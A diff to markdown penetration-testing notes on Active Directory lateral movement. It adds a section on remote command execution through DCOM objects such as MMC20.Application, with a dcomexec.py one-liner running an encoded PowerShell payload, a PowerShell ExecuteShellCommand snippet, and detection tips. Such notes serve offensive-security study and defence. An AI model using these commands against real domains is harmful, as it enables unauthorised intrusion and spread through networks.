@@ -5,7 +5,7 @@ tags: [0xdf, active-directory, kerberos, lateral-movement, pass-the-hash, post-e
 phase: post-exploitation
 date_created: 2026-05-08
 date_updated: 2026-05-13
-sources: [thm-ad-lateral, 0xdf-windows-ad]
+sources: [thm-ad-lateral, 0xdf-windows-ad, hacktricks-windows]
 ---
 
 # Active Directory Lateral Movement
@@ -173,6 +173,20 @@ Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Insta
 wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
 ```
 
+
+### 6. DCOM Object Method Execution
+
+Abuse DCOM objects whose methods reach a shell, running as the interactive user of the DCOM launch over 135 plus dynamic RPC. Common objects: `MMC20.Application` (`Document.ActiveView.ExecuteShellCommand`), `ShellWindows`, `ShellBrowserWindow`, and Office `Excel.Application`. No service is installed (evades 7045), but the payload parent is `mmc.exe`, `explorer.exe`, or an Office process.
+
+```bash
+dcomexec.py -object MMC20 DOMAIN/user:Password@HOST "powershell -enc <B64>"
+```
+```powershell
+$d = [Type]::GetTypeFromProgID("MMC20.Application","HOST")
+[Activator]::CreateInstance($d).Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c <payload>","7")
+```
+
+Detection: shells parented by `mmc.exe`, an Office app, or `explorer.exe`; DCOM activation logs and RPC to 135.
 ## Key Payloads / Examples
 
 ### Pass-the-Hash (NTLM)
